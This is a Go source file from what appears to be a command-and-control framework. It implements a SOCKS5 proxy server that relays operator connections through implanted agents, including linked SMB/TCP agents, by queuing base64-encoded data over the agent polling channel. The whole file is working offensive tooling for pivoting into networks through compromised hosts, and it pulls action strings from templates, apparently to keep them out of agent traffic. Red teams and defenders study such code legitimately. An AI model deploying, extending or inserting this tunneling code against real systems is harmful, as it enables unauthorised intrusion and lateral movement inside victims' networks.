// internal/agent/socks_http/server.go
// HTTP-based SOCKS proxy that uses the normal agent polling mechanism.
// This enables SOCKS proxying through linked agents (SMB/TCP) without requiring
// a dedicated WebSocket connection from the agent.
package socks_http

import (
	"c2/internal/templates"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"sync"
	"time"
)

// Session states
type SessionState int

const (
	StateConnecting SessionState = iota
	StateConnected
	StateClosed
)

// SocksSession represents a SOCKS connection from a client tool
type SocksSession struct {
	ID           string
	ClientConn   net.Conn
	State        SessionState
	Destination  string        // target host:port
	ResponseChan chan *SessionResponse
	LastActivity time.Time
	mu           sync.Mutex
}

// SessionResponse is data coming back from the agent
type SessionResponse struct {
	Data  []byte
	Error error
	Close bool
}

// SocksCommand is sent to the agent via the command buffer
type SocksCommand struct {
	Type      int      `json:"t"`             // Command type (CmdSocksHTTP = 19)
	Version   int      `json:"v"`             // Protocol version
	Action    string   `json:"at"`            // connect, data, close
	SessionID string   `json:"sid"`           // Unique session ID
	Dest      string   `json:"dst,omitempty"` // Destination for connect
	Data      string   `json:"d,omitempty"`   // Base64 encoded data
	Templates []string `json:"tpl,omitempty"` // Template strings (only sent on first command)
}

// Global template cache - only fetched once
var socksHTTPTemplate *templates.CommandTemplate
var templateOnce sync.Once

func getSocksHTTPTemplate() *templates.CommandTemplate {
	templateOnce.Do(func() {
		socksHTTPTemplate = templates.GetSocksHTTPTemplate()
	})
	return socksHTTPTemplate
}

// SocksResponse is received from the agent via POST
type SocksResponse struct {
	SessionID string `json:"sid"`
	Status    string `json:"st"`  // connected, data, closed, error
	Data      string `json:"d"`   // Base64 encoded response data
	Error     string `json:"err"` // Error message if status is error
}

// CommandQueueFunc is a function that queues a command for an agent
type CommandQueueFunc func(agentID string, cmdType int, data string) error

// Server is the HTTP-based SOCKS proxy server
type Server struct {
	listenAddr   string
	agentID      string
	listener     net.Listener
	sessions     map[string]*SocksSession
	sessionsMu   sync.RWMutex
	running      bool
	stopCh       chan struct{}
	queueCommand CommandQueueFunc
	wg           sync.WaitGroup
}

// NewServer creates a new HTTP SOCKS server
func NewServer(port int, agentID string, queueFn CommandQueueFunc) *Server {
	return &Server{
		listenAddr:   fmt.Sprintf("0.0.0.0:%d", port), // Bind to all interfaces so it's accessible outside Docker
		agentID:      agentID,
		sessions:     make(map[string]*SocksSession),
		queueCommand: queueFn,
		stopCh:       make(chan struct{}),
	}
}

// Start begins listening for SOCKS connections
func (s *Server) Start() error {
	listener, err := net.Listen("tcp", s.listenAddr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %v", s.listenAddr, err)
	}

	s.listener = listener
	s.running = true

	log.Printf("[SOCKS-HTTP] Started HTTP-based SOCKS proxy on %s for agent %s", s.listenAddr, s.agentID)

	// Start cleanup goroutine
	s.wg.Add(1)
	go s.cleanupStaleSessions()

	// Accept connections
	s.wg.Add(1)
	go s.acceptLoop()

	return nil
}

// Stop shuts down the server
func (s *Server) Stop() {
	s.running = false
	close(s.stopCh)

	if s.listener != nil {
		s.listener.Close()
	}

	// Close all sessions
	s.sessionsMu.Lock()
	for _, session := range s.sessions {
		session.mu.Lock()
		session.State = StateClosed
		if session.ResponseChan != nil {
			close(session.ResponseChan)
		}
		if session.ClientConn != nil {
			session.ClientConn.Close()
		}
		session.mu.Unlock()
	}
	s.sessions = make(map[string]*SocksSession)
	s.sessionsMu.Unlock()

	s.wg.Wait()
	log.Printf("[SOCKS-HTTP] Stopped HTTP-based SOCKS proxy on %s", s.listenAddr)
}

func (s *Server) acceptLoop() {
	defer s.wg.Done()

	for s.running {
		conn, err := s.listener.Accept()
		if err != nil {
			if s.running {
				log.Printf("[SOCKS-HTTP] Accept error: %v", err)
			}
			continue
		}

		go s.handleConnection(conn)
	}
}

func (s *Server) handleConnection(conn net.Conn) {
	defer conn.Close()

	// Set initial deadline for handshake
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	// SOCKS5 handshake
	// Read version and methods
	buf := make([]byte, 256)
	n, err := conn.Read(buf)
	if err != nil || n < 2 {
		log.Printf("[SOCKS-HTTP] Failed to read greeting: %v", err)
		return
	}

	if buf[0] != 0x05 {
		log.Printf("[SOCKS-HTTP] Unsupported SOCKS version: %d", buf[0])
		return
	}

	// Send response: SOCKS5, no auth required
	_, err = conn.Write([]byte{0x05, 0x00})
	if err != nil {
		log.Printf("[SOCKS-HTTP] Failed to send greeting response: %v", err)
		return
	}

	// Read request
	n, err = conn.Read(buf)
	if err != nil || n < 7 {
		log.Printf("[SOCKS-HTTP] Failed to read request: %v", err)
		return
	}

	if buf[0] != 0x05 {
		log.Printf("[SOCKS-HTTP] Invalid SOCKS version in request: %d", buf[0])
		return
	}

	cmd := buf[1]
	if cmd != 0x01 { // Only CONNECT is supported
		// Send command not supported error
		conn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		log.Printf("[SOCKS-HTTP] Unsupported command: %d", cmd)
		return
	}

	// Parse address
	addrType := buf[3]
	var host string
	var portIdx int

	switch addrType {
	case 0x01: // IPv4
		if n < 10 {
			log.Printf("[SOCKS-HTTP] Invalid IPv4 request length")
			return
		}
		host = fmt.Sprintf("%d.%d.%d.%d", buf[4], buf[5], buf[6], buf[7])
		portIdx = 8
	case 0x03: // Domain name
		domainLen := int(buf[4])
		if n < 5+domainLen+2 {
			log.Printf("[SOCKS-HTTP] Invalid domain request length")
			return
		}
		host = string(buf[5 : 5+domainLen])
		portIdx = 5 + domainLen
	case 0x04: // IPv6
		if n < 22 {
			log.Printf("[SOCKS-HTTP] Invalid IPv6 request length")
			return
		}
		host = fmt.Sprintf("[%x:%x:%x:%x:%x:%x:%x:%x]",
			uint16(buf[4])<<8|uint16(buf[5]),
			uint16(buf[6])<<8|uint16(buf[7]),
			uint16(buf[8])<<8|uint16(buf[9]),
			uint16(buf[10])<<8|uint16(buf[11]),
			uint16(buf[12])<<8|uint16(buf[13]),
			uint16(buf[14])<<8|uint16(buf[15]),
			uint16(buf[16])<<8|uint16(buf[17]),
			uint16(buf[18])<<8|uint16(buf[19]))
		portIdx = 20
	default:
		// Send address type not supported
		conn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		log.Printf("[SOCKS-HTTP] Unsupported address type: %d", addrType)
		return
	}

	port := uint16(buf[portIdx])<<8 | uint16(buf[portIdx+1])
	dest := fmt.Sprintf("%s:%d", host, port)

	// Create session
	sessionID := generateSessionID()
	session := &SocksSession{
		ID:           sessionID,
		ClientConn:   conn,
		State:        StateConnecting,
		Destination:  dest,
		ResponseChan: make(chan *SessionResponse, 100),
		LastActivity: time.Now(),
	}

	s.sessionsMu.Lock()
	s.sessions[sessionID] = session
	s.sessionsMu.Unlock()

	log.Printf("[SOCKS-HTTP] Session %s: connecting to %s", sessionID, dest)

	// Queue connect command to agent - include template on first connect
	tpl := getSocksHTTPTemplate()
	connectCmd := SocksCommand{
		Type:      19, // CmdSocksHTTP
		Version:   1,
		Action:    tpl.Templates[templates.IdxSocksHTTPActionConnect], // "connect"
		SessionID: sessionID,
		Dest:      dest,
		Templates: tpl.Templates, // Include template strings
	}

	cmdJSON, _ := json.Marshal(connectCmd)
	if err := s.queueCommand(s.agentID, 19, string(cmdJSON)); err != nil {
		log.Printf("[SOCKS-HTTP] Failed to queue connect command: %v", err)
		conn.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // General failure
		s.cleanupSession(sessionID)
		return
	}

	// Wait for connect response with timeout
	select {
	case resp := <-session.ResponseChan:
		if resp == nil || resp.Error != nil {
			errMsg := "connection failed"
			if resp != nil && resp.Error != nil {
				errMsg = resp.Error.Error()
			}
			log.Printf("[SOCKS-HTTP] Session %s: connect failed: %s", sessionID, errMsg)
			conn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // Connection refused
			s.cleanupSession(sessionID)
			return
		}
	case <-time.After(60 * time.Second):
		log.Printf("[SOCKS-HTTP] Session %s: connect timeout", sessionID)
		conn.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // Host unreachable
		s.cleanupSession(sessionID)
		return
	case <-s.stopCh:
		s.cleanupSession(sessionID)
		return
	}

	session.mu.Lock()
	session.State = StateConnected
	session.mu.Unlock()

	// Send success response
	// Reply format: VER REP RSV ATYP BND.ADDR BND.PORT
	reply := []byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0}
	_, err = conn.Write(reply)
	if err != nil {
		log.Printf("[SOCKS-HTTP] Failed to send success response: %v", err)
		s.cleanupSession(sessionID)
		return
	}

	log.Printf("[SOCKS-HTTP] Session %s: connected to %s", sessionID, dest)

	// Clear deadline for data relay
	conn.SetDeadline(time.Time{})

	// Start relay loops
	done := make(chan struct{})

	// Client -> Agent
	go func() {
		defer func() {
			select {
			case <-done:
			default:
				close(done)
			}
		}()

		buf := make([]byte, 32*1024)
		for {
			n, err := conn.Read(buf)
			if err != nil {
				if err != io.EOF {
					log.Printf("[SOCKS-HTTP] Session %s: read error: %v", sessionID, err)
				}
				return
			}

			if n > 0 {
				session.mu.Lock()
				session.LastActivity = time.Now()
				session.mu.Unlock()

				// Queue data command - use template string for action
				tpl := getSocksHTTPTemplate()
				dataCmd := SocksCommand{
					Type:      19,
					Version:   1,
					Action:    tpl.Templates[templates.IdxSocksHTTPActionData], // "data"
					SessionID: sessionID,
					Data:      base64.StdEncoding.EncodeToString(buf[:n]),
				}
				cmdJSON, _ := json.Marshal(dataCmd)
				if err := s.queueCommand(s.agentID, 19, string(cmdJSON)); err != nil {
					log.Printf("[SOCKS-HTTP] Session %s: failed to queue data: %v", sessionID, err)
					return
				}
			}
		}
	}()

	// Agent -> Client
	go func() {
		defer func() {
			select {
			case <-done:
			default:
				close(done)
			}
		}()

		for {
			select {
			case resp, ok := <-session.ResponseChan:
				if !ok || resp == nil {
					return
				}

				if resp.Close || resp.Error != nil {
					return
				}

				if len(resp.Data) > 0 {
					session.mu.Lock()
					session.LastActivity = time.Now()
					session.mu.Unlock()

					_, err := conn.Write(resp.Data)
					if err != nil {
						log.Printf("[SOCKS-HTTP] Session %s: write error: %v", sessionID, err)
						return
					}
				}

			case <-s.stopCh:
				return
			}
		}
	}()

	// Wait for either direction to finish
	<-done

	// Send close command - use template string for action
	tpl = getSocksHTTPTemplate()
	closeCmd := SocksCommand{
		Type:      19,
		Version:   1,
		Action:    tpl.Templates[templates.IdxSocksHTTPActionClose], // "close"
		SessionID: sessionID,
	}
	cmdJSON, _ = json.Marshal(closeCmd)
	s.queueCommand(s.agentID, 19, string(cmdJSON))

	s.cleanupSession(sessionID)
}

// HandleAgentResponse processes SOCKS responses from the agent
func (s *Server) HandleAgentResponse(responses []SocksResponse) {
	for _, resp := range responses {
		s.sessionsMu.RLock()
		session, exists := s.sessions[resp.SessionID]
		s.sessionsMu.RUnlock()

		if !exists {
			continue
		}

		session.mu.Lock()
		session.LastActivity = time.Now()
		session.mu.Unlock()

		switch resp.Status {
		case "connected":
			// Signal successful connection
			select {
			case session.ResponseChan <- &SessionResponse{}:
			default:
			}

		case "data":
			// Decode and forward data
			data, err := base64.StdEncoding.DecodeString(resp.Data)
			if err != nil {
				log.Printf("[SOCKS-HTTP] Session %s: failed to decode data: %v", resp.SessionID, err)
				continue
			}
			select {
			case session.ResponseChan <- &SessionResponse{Data: data}:
			default:
				log.Printf("[SOCKS-HTTP] Session %s: response channel full, dropping data", resp.SessionID)
			}

		case "closed":
			select {
			case session.ResponseChan <- &SessionResponse{Close: true}:
			default:
			}
			s.cleanupSession(resp.SessionID)

		case "error":
			select {
			case session.ResponseChan <- &SessionResponse{Error: fmt.Errorf(resp.Error)}:
			default:
			}
			s.cleanupSession(resp.SessionID)
		}
	}
}

func (s *Server) cleanupSession(sessionID string) {
	s.sessionsMu.Lock()
	session, exists := s.sessions[sessionID]
	if exists {
		session.mu.Lock()
		session.State = StateClosed
		if session.ResponseChan != nil {
			select {
			case <-session.ResponseChan:
			default:
			}
			close(session.ResponseChan)
			session.ResponseChan = nil
		}
		session.mu.Unlock()
		delete(s.sessions, sessionID)
	}
	s.sessionsMu.Unlock()
}

func (s *Server) cleanupStaleSessions() {
	defer s.wg.Done()

	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			now := time.Now()
			staleTimeout := 5 * time.Minute

			s.sessionsMu.RLock()
			var staleIDs []string
			for id, session := range s.sessions {
				session.mu.Lock()
				if now.Sub(session.LastActivity) > staleTimeout {
					staleIDs = append(staleIDs, id)
				}
				session.mu.Unlock()
			}
			s.sessionsMu.RUnlock()

			for _, id := range staleIDs {
				log.Printf("[SOCKS-HTTP] Cleaning up stale session: %s", id)
				// Send close command - use template string for action
				tpl := getSocksHTTPTemplate()
				closeCmd := SocksCommand{
					Type:      19,
					Version:   1,
					Action:    tpl.Templates[templates.IdxSocksHTTPActionClose], // "close"
					SessionID: id,
				}
				cmdJSON, _ := json.Marshal(closeCmd)
				s.queueCommand(s.agentID, 19, string(cmdJSON))
				s.cleanupSession(id)
			}

		case <-s.stopCh:
			return
		}
	}
}

// GetPort returns the port the server is listening on
func (s *Server) GetPort() int {
	if s.listener == nil {
		return 0
	}
	addr := s.listener.Addr().(*net.TCPAddr)
	return addr.Port
}

// generateSessionID creates a unique session ID
func generateSessionID() string {
	return fmt.Sprintf("%d%d", time.Now().UnixNano(), time.Now().UnixNano()%1000)
}

// Global server registry to track SOCKS HTTP servers by agent ID
var (
	serverRegistry   = make(map[string]*Server)
	serverRegistryMu sync.RWMutex
)

// RegisterServer adds a server to the global registry
func RegisterServer(agentID string, server *Server) {
	serverRegistryMu.Lock()
	serverRegistry[agentID] = server
	serverRegistryMu.Unlock()
}

// UnregisterServer removes a server from the global registry
func UnregisterServer(agentID string) {
	serverRegistryMu.Lock()
	delete(serverRegistry, agentID)
	serverRegistryMu.Unlock()
}

// GetServer returns the server for an agent, or nil if not found
func GetServer(agentID string) *Server {
	serverRegistryMu.RLock()
	defer serverRegistryMu.RUnlock()
	return serverRegistry[agentID]
}

// ProcessAgentResponses handles SOCKS responses from an agent
// This is called from handler_active.go when an agent POSTs SOCKS data
func ProcessAgentResponses(agentID string, responses []map[string]interface{}) {
	server := GetServer(agentID)
	if server == nil {
		return
	}

	// Convert map format to SocksResponse
	var socksResponses []SocksResponse
	for _, r := range responses {
		resp := SocksResponse{}
		if sid, ok := r["sid"].(string); ok {
			resp.SessionID = sid
		}
		if st, ok := r["st"].(string); ok {
			resp.Status = st
		}
		if d, ok := r["d"].(string); ok {
			resp.Data = d
		}
		if err, ok := r["err"].(string); ok {
			resp.Error = err
		}
		socksResponses = append(socksResponses, resp)
	}

	if len(socksResponses) > 0 {
		server.HandleAgentResponse(socksResponses)
	}
}
